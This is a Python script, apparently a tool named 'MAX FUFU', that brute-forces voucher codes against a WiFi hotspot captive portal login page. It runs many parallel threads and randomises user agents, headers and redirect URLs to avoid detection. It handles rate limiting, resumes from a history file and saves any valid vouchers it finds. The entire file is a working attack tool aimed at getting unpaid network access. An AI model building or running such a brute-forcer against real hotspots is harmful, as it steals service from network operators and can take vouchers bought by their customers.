
import requests
import random
import string
import sys
import os
import re
import time
import threading
import configparser
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ============================================================
# COLORS
# ============================================================
class c:
    purple = '\033[95m'
    ob     = '\033[94m'
    oc     = '\033[96m'
    og     = '\033[92m'
    warn   = '\033[93m'
    error  = '\033[91m'
    n      = '\033[0m'
    bold   = '\033[1m'
    b_purple = '\033[95;1m'
    b_blue   = '\033[94;1m'
    b_cyan   = '\033[96;1m'
    b_green  = '\033[92;1m'
    b_yellow = '\033[93;1m'


# ============================================================
# BANNER + RAINBOW
# ============================================================
BANNER_ART = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣤⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠤⠶⢦⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⠀⣀⠀⢀⡤⢈⣡⡴⠶⠶⠶⣤⣄⠀⢤⡀ ⢀⡀⢀⡀⠀⠀⠀⠀
⠀⠀⠀⠁⢸⡏⣸⠋⣰⠏⣰⠟⢡⡴⠖⠚⠶⣤⡉⢷⡀⢳⡈⢷⡌⡿⠈⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢿⠀⡟⢰⡏⣰⠏⣰⠞⠛⢢⠈⣧⠘⡇⠈⡇⠸⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠃⢺⡇⢺⡄⢿⡀⠢⠜⣠⡏⢠⡏⠸⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡈⢳⣌⡙⠳⠟⢋⣴⠏⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣌⠻⢦⣌⣙⡛⠛⣉⣡⡴⠋⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢼⣤⡙⠷⣦⠌⠉⠙⠋⢉⣡⣴⠾⣋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣦⡌⠛⠀⠀⠀⠀⠀⠀⠀⠈⠐⠚⠋⡁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀▀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
  ▁ ▂ ▄ ▅ ▆ ▇ █ █ ▇ ▆ ▅ ▄ ▂ ▁

       ⚜M⚜A⚜X⚜ ⚜F⚜U⚜F⚜U⚜
"""

RAINBOW = [
    c.b_purple,
    c.b_blue,
    c.b_cyan,
    c.b_green,
    c.b_yellow,
]

BANNER_LINES  = BANNER_ART.strip("\n").split("\n")
BANNER_HEIGHT = len(BANNER_LINES)
_banner_running = threading.Event()
_banner_thread  = None


def print_banner(color, first=False):
    if first:
        sys.stdout.write("\n" * (BANNER_HEIGHT + 1))
    sys.stdout.write(f"\033[{BANNER_HEIGHT + 1}A")
    for line in BANNER_LINES:
        sys.stdout.write(f"\r\033[K{color}{line}{c.n}\n")
    sys.stdout.flush()


def _banner_animator(interval=0.35):
    idx = 0
    while _banner_running.is_set():
        print_banner(RAINBOW[idx % len(RAINBOW)])
        idx += 1
        time.sleep(interval)


def start_banner_animation(interval=0.35):
    global _banner_thread
    _banner_running.set()
    print_banner(RAINBOW[0], first=True)
    _banner_thread = threading.Thread(
        target=_banner_animator, args=(interval,), daemon=True
    )
    _banner_thread.start()


def stop_banner_animation():
    _banner_running.clear()
    if _banner_thread is not None:
        _banner_thread.join(timeout=1.0)
    sys.stdout.write("\n")
    sys.stdout.flush()


# ============================================================
# CONFIG LOADER
# ============================================================
def load_config(path="config.ini"):
    if not os.path.exists(path):
        print(f"{c.error}[!] config.ini not found: {path}{c.n}")
        sys.exit(1)

    cfg = configparser.ConfigParser()
    cfg.read(path)

    conf = {
        'target_name':      cfg.get('TARGET', 'name', fallback='HotSpot'),
        'target_url':       cfg.get('TARGET', 'url'),
        'login_path':       cfg.get('TARGET', 'login_path', fallback='/login'),

        # ---- Gateway ----
        'gateway_ip':       cfg.get('TARGET', 'gateway_ip', fallback=None),
        'gateway_port':     cfg.getint('TARGET', 'gateway_port', fallback=80),
        'gateway_scheme':   cfg.get('TARGET', 'gateway_scheme', fallback='http'),

        # ---- Settings ----
        'code_length':      cfg.getint('SETTINGS', 'code_length', fallback=6),
        'charset':          cfg.get('SETTINGS', 'charset', fallback='0123456789'),
        'random_order':     cfg.getboolean('SETTINGS', 'random_order', fallback=True),
        'max_workers':      cfg.getint('SETTINGS', 'max_workers', fallback=50),
        'batch_submit':     cfg.getint('SETTINGS', 'batch_submit', fallback=200),
        'connection_pool':  cfg.getint('SETTINGS', 'connection_pool', fallback=100),
        'random_headers':   cfg.getboolean('SETTINGS', 'random_headers', fallback=True),
        'random_dst':       cfg.getboolean('SETTINGS', 'random_dst', fallback=True),
        'timeout':          cfg.getint('SETTINGS', 'timeout', fallback=10),
        'retry_count':      cfg.getint('SETTINGS', 'retry_count', fallback=2),
        'delay_min':        cfg.getfloat('SETTINGS', 'delay_min', fallback=0.0),
        'delay_max':        cfg.getfloat('SETTINGS', 'delay_max', fallback=0.05),

        # ---- History ----
        'history_file':     cfg.get('HISTORY', 'file', fallback='history.txt'),
        'success_file':     cfg.get('HISTORY', 'success', fallback='success.txt'),

        # ---- Output ----
        'show_failed':      cfg.getboolean('OUTPUT', 'show_failed', fallback=False),
        'show_limited':     cfg.getboolean('OUTPUT', 'show_limited', fallback=True),
        'show_progress':    cfg.getboolean('OUTPUT', 'show_progress', fallback=True),
    }

    # ---- Gateway auto-detect ----
    if not conf['gateway_ip']:
        try:
            parsed = urlparse(conf['target_url'])
            conf['gateway_ip']     = parsed.hostname
            conf['gateway_port']   = parsed.port or (443 if parsed.scheme == 'https' else 80)
            conf['gateway_scheme'] = parsed.scheme
            print(f"{c.warn}[!] gateway_ip auto-detected: {conf['gateway_ip']}{c.n}")
        except Exception as e:
            print(f"{c.error}[!] gateway_ip missing and cannot auto-detect: {e}{c.n}")
            sys.exit(1)

    # ---- Validate ----
    if not conf['target_url']:
        print(f"{c.error}[!] TARGET.url is required in config.in{c.n}")
        sys.exit(1)

    return conf


# ============================================================
# GLOBALS
# ============================================================
CONF          = None
LOGIN_URL     = None
BASE_URL      = None
tried_codes   = set()
tried_lock    = threading.Lock()
success_event = threading.Event()
attempt_count = 0
attempt_lock  = threading.Lock()
valid_codes   = []
start_time    = time.time()


# ============================================================
# HEADERS / DST
# ============================================================
def random_user_agent():
    android_ver = random.choice(['6', '7', '8', '9', '10', '11', '12', '13', '14'])
    chrome_ver  = random.randint(120, 139)
    models = [
        'K', 'SM-S911B', 'SM-A125F', 'Redmi Note 10',
        'Pixel 5', 'M2101K7AG', 'CPH2211', 'V2027', 'SM-A536B'
    ]
    model = random.choice(models)
    return (
        f'Mozilla/5.0 (Linux; Android {android_ver}; {model}) '
        f'AppleWebKit/537.36 (KHTML, like Gecko) '
        f'Chrome/{chrome_ver}.0.0.0 Mobile Safari/537.36'
    )


def random_dst():
    """Gateway IP အခြေခံ random dst URL (MikroTik captive portal detection)"""
    gw      = CONF['gateway_ip']
    scheme  = CONF['gateway_scheme']
    port    = CONF['gateway_port']

    is_default_port = (
        (scheme == 'http'  and port == 80) or
        (scheme == 'https' and port == 443)
    )
    port_str = "" if is_default_port else f":{port}"

    rand_path = random.choice([
        '/',
        '/generate_204',
        '/hotspot-detect.html',
        '/connecttest.txt',
        f'/r{random.randint(1000, 9999)}',
        f'/{random.randint(0, 9)}',
    ])
    return f"{scheme}://{gw}{port_str}{rand_path}"


def build_headers():
    if CONF['random_headers']:
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': random.choice([
                'en-US,en;q=0.9',
                'en-GB,en;q=0.8',
                'en-US,en;q=0.9,my;q=0.8',
            ]),
            'Cache-Control': random.choice(['max-age=0', 'no-cache', 'no-store']),
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': BASE_URL,
            'Referer': LOGIN_URL,
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': random_user_agent(),
        }
    return {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': BASE_URL,
        'Referer': LOGIN_URL,
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
    }


def probe_gateway():
    url = f"{CONF['gateway_scheme']}://{CONF['gateway_ip']}:{CONF['gateway_port']}/"
    try:
        r = requests.get(
            url, timeout=5, verify=False, allow_redirects=False,
        )
        return {
            'reachable': True,
            'status':    r.status_code,
            'server':    r.headers.get('Server', 'unknown'),
            'redirect':  r.headers.get('Location', None),
        }
    except requests.exceptions.ConnectionError:
        return {'reachable': False, 'error': 'connection refused'}
    except requests.exceptions.Timeout:
        return {'reachable': False, 'error': 'timeout'}
    except Exception as e:
        return {'reachable': False, 'error': str(e)}


# ============================================================
# LOGIN WORKER
# ============================================================
def login(voucher):
    global attempt_count

    if success_event.is_set():
        return None

    with tried_lock:
        if voucher in tried_codes:
            return None
        tried_codes.add(voucher)

    headers = build_headers()
    data = {
        'dst':      random_dst() if CONF['random_dst'] else '',
        'popup':    'true',
        'username': voucher,
        'password': '',
    }

    for _ in range(CONF['retry_count']):
        if success_event.is_set():
            return None

        try:
            r = requests.post(
                LOGIN_URL,
                data=data,
                headers=headers,
                verify=False,
                timeout=CONF['timeout'],
                allow_redirects=False,
            )
            text = r.text.lower()

            with attempt_lock:
                attempt_count += 1

            # ---- Success ----
            if r.status_code == 302 or 'logonurl' in text or 'success' in text:
                print(f"\n{c.og}{'=' * 50}{c.n}")
                print(f"{c.og}[✓] VALID VOUCHER: {voucher}{c.n}")
                print(f"{c.og}{'=' * 50}{c.n}")

                with tried_lock:
                    if voucher not in valid_codes:
                        valid_codes.append(voucher)
                        with open(CONF['success_file'], 'a') as f:
                            f.write(f"{voucher} | {time.ctime()}\n")

                success_event.set()
                return voucher

            # ---- Failed / Limited ----
            elif 'invalid' in text or 'failed' in text:
                if CONF['show_failed']:
                    print(f"{c.error}[✗] {voucher}{c.n}")
                return None

            elif 'already' in text or 'limited' in text:
                if CONF['show_limited']:
                    print(f"{c.warn}[!] {voucher} - Rate limited{c.n}")
                time.sleep(2)
                return None

            else:
                if CONF['show_failed']:
                    print(f"{c.ob}[?] {voucher} - Unknown response{c.n}")
                return None

        except requests.exceptions.Timeout:
            time.sleep(0.5)
        except requests.exceptions.ConnectionError:
            time.sleep(1)
        except Exception:
            time.sleep(0.5)

    return None


# ============================================================
# CODE GENERATORS
# ============================================================
def random_code_generator():
    while not success_event.is_set():
        yield ''.join(random.choices(CONF['charset'], k=CONF['code_length']))


def sequential_shuffled_generator():
    total = 10 ** CONF['code_length']
    codes = [str(i).zfill(CONF['code_length']) for i in range(total)]
    random.shuffle(codes)
    for code in codes:
        if success_event.is_set():
            return
        yield code


# ============================================================
# PROGRESS MONITOR
# ============================================================
def progress_monitor():
    while not success_event.is_set():
        time.sleep(1)
        elapsed = time.time() - start_time
        speed = attempt_count / elapsed if elapsed > 0 else 0
        sys.stdout.write(
            f"\r{c.oc}[⚡] {speed:6.1f} c/s | "
            f"Tried: {attempt_count:>10,} | "
            f"Found: {len(valid_codes)} | "
            f"Time: {int(elapsed)}s{c.n}   "
        )
        sys.stdout.flush()


# ============================================================
# MAIN RUNNER
# ============================================================
def runner():
    global CONF, LOGIN_URL, BASE_URL

    CONF     = load_config()
    BASE_URL = CONF['target_url'].rstrip('/')
    LOGIN_URL = BASE_URL + CONF['login_path']

    os.system('cls' if os.name == 'nt' else 'clear')

    # ---------- Rainbow Banner ----------
    start_banner_animation(interval=0.35)
    time.sleep(1.2)          # animation ပြချိန်
    stop_banner_animation()

    # ---------- Info ----------
    print(f"  Target   : {c.oc}{CONF['target_name']}{c.n}")
    print(f"  URL      : {c.oc}{LOGIN_URL}{c.n}")
    print(f"  Gateway  : {c.oc}{CONF['gateway_scheme']}://{CONF['gateway_ip']}:{CONF['gateway_port']}{c.n}")
    print(f"  Length   : {c.oc}{CONF['code_length']}{c.n}")
    print(f"  Charset  : {c.oc}{CONF['charset']}{c.n}")
    print(f"  Workers  : {c.oc}{CONF['max_workers']}{c.n}")
    print(f"  Order    : {c.oc}{'RANDOM' if CONF['random_order'] else 'SEQUENTIAL'}{c.n}")
    print(f"  Delay    : {c.oc}{CONF['delay_min']}-{CONF['delay_max']}s{c.n}\n")

    # ---------- Gateway probe ----------
    print(f"{c.ob}[*] Probing gateway {CONF['gateway_ip']}...{c.n}")
    probe = probe_gateway()
    if probe['reachable']:
        print(f"{c.og}[✓] Gateway reachable: HTTP {probe['status']} (Server: {probe['server']}){c.n}")
        if probe['redirect']:
            print(f"{c.ob}[*] Redirect → {probe['redirect']}{c.n}")
    else:
        print(f"{c.error}[✗] Gateway unreachable: {probe['error']}{c.n}")
        print(f"{c.warn}[!] gateway_ip / gateway_port / gateway_scheme ကို စစ်ပါ{c.n}")
        sys.exit(1)
    print()

    # ---------- History ----------
    if os.path.exists(CONF['history_file']):
        with open(CONF['history_file'], 'r') as f:
            for line in f:
                s = line.strip()
                if s:
                    tried_codes.add(s)
    print(f"{c.ob}[*] History loaded: {len(tried_codes):,} codes{c.n}\n")

    # ---------- Generator ----------
    codes_iter = random_code_generator() if CONF['random_order'] else sequential_shuffled_generator()

    # ---------- Progress thread ----------
    if CONF['show_progress']:
        threading.Thread(target=progress_monitor, daemon=True).start()

    # ---------- Worker pool ----------
    print(f"{c.og}[+] Launching {CONF['max_workers']} workers...{c.n}\n")

    futures = []
    submitted = 0

    with ThreadPoolExecutor(max_workers=CONF['max_workers']) as pool:
        try:
            for code in codes_iter:
                if success_event.is_set():
                    break

                futures.append(pool.submit(login, code))
                submitted += 1

                # Batch control
                if submitted % CONF['batch_submit'] == 0:
                    futures = [f for f in futures if not f.done()]
                    if CONF['delay_max'] > 0:
                        time.sleep(random.uniform(CONF['delay_min'], CONF['delay_max']))

                # Memory guard
                if len(futures) > CONF['max_workers'] * 4:
                    as_completed(futures, timeout=None)
                    futures = [f for f in futures if not f.done()]

            # Wait remaining
            for f in as_completed(futures):
                if success_event.is_set():
                    for x in futures:
                        x.cancel()
                    break

        except KeyboardInterrupt:
            success_event.set()
            print(f"\n{c.warn}[!] Stopped by user{c.n}")

    # ---------- Summary ----------
    elapsed = max(time.time() - start_time, 0.001)
    print(f"\n\n{c.og}{'=' * 50}{c.n}")
    print(f"{c.og}  SCAN COMPLETE{c.n}")
    print(f"{c.og}{'=' * 50}{c.n}")
    print(f"  Time     : {int(elapsed)}s")
    print(f"  Attempts : {attempt_count:,}")
    print(f"  Speed    : {attempt_count / elapsed:.1f} c/s")
    print(f"  Found    : {len(valid_codes)}")

    if valid_codes:
        print(f"\n{c.og}Valid Vouchers:{c.n}")
        for code in valid_codes:
            print(f"  {c.og}→ {code}{c.n}")
        print(f"\n{c.og}[✓] Saved to: {CONF['success_file']}{c.n}")


# ============================================================
# ENTRY
# ============================================================
if __name__ == "__main__":
    try:
        runner()
    except KeyboardInterrupt:
        print(f"\n{c.warn}[!] Stopped by user{c.n}")
